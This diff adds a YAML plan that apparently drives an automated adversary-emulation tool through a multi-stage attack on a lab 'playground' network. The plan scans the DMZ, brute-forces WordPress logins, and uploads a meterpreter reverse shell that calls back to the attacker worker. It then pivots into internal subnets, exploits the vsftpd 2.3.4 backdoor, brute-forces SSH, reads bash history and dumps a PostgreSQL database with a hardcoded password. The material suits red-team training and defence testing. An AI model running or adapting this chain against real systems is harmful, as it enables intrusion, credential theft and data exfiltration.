@@ -1,0 +1,199 @@
+---
+name: Playground demo
+settings:
+  separator: "|"
+stages:
+    # Stage 1a
+    1a-dmz-information-gathering:
+      steps:
+        scan-dmz:
+          is_init: true
+          module: nmap
+          arguments:
+            target: {{ networks.public.subnet }}
+            options: --exclude {{ networks.public.hosts.cryton_worker }} -sV --open
+            ports:
+              - 80
+              - 3306
+          next:
+            - type: result
+              value: ok
+              step: scan-wordpress-site
+
+        scan-wordpress-site:
+          module: wpscan
+          arguments:
+            target: {{ networks.public.hosts.wordpress }}
+
+    # Stage 1b
+    1b-wordpress-exploitation:
+      depends_on:
+        - 1a-dmz-information-gathering
+      steps:
+        get-wordpress-credentials:
+          is_init: true
+          module: nmap
+          arguments:
+            target: {{ networks.public.hosts.wordpress }}
+            options: --script http-wordpress-brute --script-args 'userdb=/opt/resources/user_list.txt,passdb=/opt/resources/pass_list.txt,http-wordpress-brute.threads=3,brute.firstonly=true'
+          next:
+            - type: result
+              value: ok
+              step: upload-php-shell
+
+        upload-php-shell:
+          module: metasploit
+          arguments:
+            module_name: unix/webapp/wp_admin_shell_upload
+            datastore:
+              RHOSTS: {{ networks.public.hosts.wordpress }}
+              USERNAME: $parent|{{ networks.public.hosts.wordpress }}|ports[0]|scripts[0]|data|Accounts|children[0]|username
+              PASSWORD: $parent|{{ networks.public.hosts.wordpress }}|ports[0]|scripts[0]|data|Accounts|children[0]|password
+              PAYLOAD: php/meterpreter/reverse_tcp
+              LHOST: {{ networks.public.hosts.cryton_worker }}
+
+    # Stage 2a
+    2a-server-net-information-gathering:
+      depends_on:
+        - 1b-wordpress-exploitation
+      steps:
+        read-wp-hosts:
+          is_init: true
+          module: command
+          arguments:
+            session_id: $upload-php-shell|session_id
+            command: cat /etc/hosts
+          next:
+            - type: output
+              value: {{ networks.server_net.hosts.wordpress }}
+              step: create-route-to-server-net
+
+        create-route-to-server-net:
+          metadata:
+            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+          module: metasploit
+          arguments:
+            module_name: multi/manage/autoroute
+            datastore:
+              CMD: add
+              SUBNET: {{ networks.server_net.subnet_ip }}
+              SESSION: $upload-php-shell|session_id
+          next:
+            - type: result
+              value: ok
+              step: scan-ftp-server
+
+        scan-ftp-server:
+          module: metasploit
+          arguments:
+            module_name: scanner/portscan/tcp
+            datastore:
+              PORTS: 21
+              RHOSTS: {{ networks.server_net.hosts.vulnerable_ftp }}
+          next:
+            - type: result
+              value: ok
+              step: scan-database-server
+
+        scan-database-server:
+          module: metasploit
+          arguments:
+            module_name: scanner/portscan/tcp
+            datastore:
+              PORTS: 5432
+              RHOSTS: {{ networks.server_net.hosts.vulnerable_db }}
+
+    # Stage 2b
+    2b-ftp-exploitation:
+      depends_on:
+        - 2a-server-net-information-gathering
+      steps:
+        exploit-ftp-server:
+          is_init: true
+          module: metasploit
+          # TODO: missing retries
+#            module_retries: 3
+          arguments:
+            module_name: unix/ftp/vsftpd_234_backdoor
+            datastore:
+              RHOSTS: {{ networks.server_net.hosts.vulnerable_ftp }}
+              PAYLOAD: cmd/unix/interact
+          next:
+            - type: result
+              value: ok
+              step: read-ftp-logs
+
+        read-ftp-logs:
+          module: command
+          arguments:
+            session_id: $upload-php-shell|session_id
+            command: cat /var/log/vsftpd.log
+
+    # Stage 3a
+    3a-user-network-information-gathering:
+      depends_on:
+        - 2b-ftp-exploitation
+      steps:
+        create-route-to-user-net:
+          metadata:
+            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+          is_init: true
+          module: metasploit
+          arguments:
+            module_name: multi/manage/autoroute
+            datastore:
+              CMD: add
+              SUBNET: {{ networks.user_net.subnet_ip }}
+              SESSION: $upload-php-shell|session_id
+          next:
+            - type: result
+              value: ok
+              step: scan-user-machine
+
+        scan-user-machine:
+          module: metasploit
+          arguments:
+            module_name: scanner/portscan/tcp
+            datastore:
+              PORTS: 22
+              RHOSTS: {{ networks.user_net.hosts.vulnerable_user_machine }}
+
+    # Stage 3b
+    3b-user-exploitation:
+      depends_on:
+        - 3a-user-network-information-gathering
+      steps:
+        bruteforce-user:
+          is_init: true
+          module: metasploit
+          arguments:
+            module_name: scanner/ssh/ssh_login
+            datastore:
+              RHOSTS: {{ networks.user_net.hosts.vulnerable_user_machine }}
+              USERNAME: {{ machines.vulnerable_user.username }}
+              PASS_FILE: /opt/resources/pass_list.txt
+              STOP_ON_SUCCESS: true
+              BLANK_PASSWORDS: true
+              THREADS: 5
+
+    # Stage 4a
+    4a-data-extraction:
+      depends_on:
+        - 3b-user-exploitation
+      steps:
+        check-user-bash-history:
+          is_init: true
+          module: command
+          arguments:
+            session_id: $bruteforce-user|session_id
+            command: cat ~/.bash_history
+          next:
+            - type: result
+              value: ok
+              step: get-data-from-database
+
+        get-data-from-database:
+          module: command
+          arguments:
+            session_id: $bruteforce-user|session_id
+            command: PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb
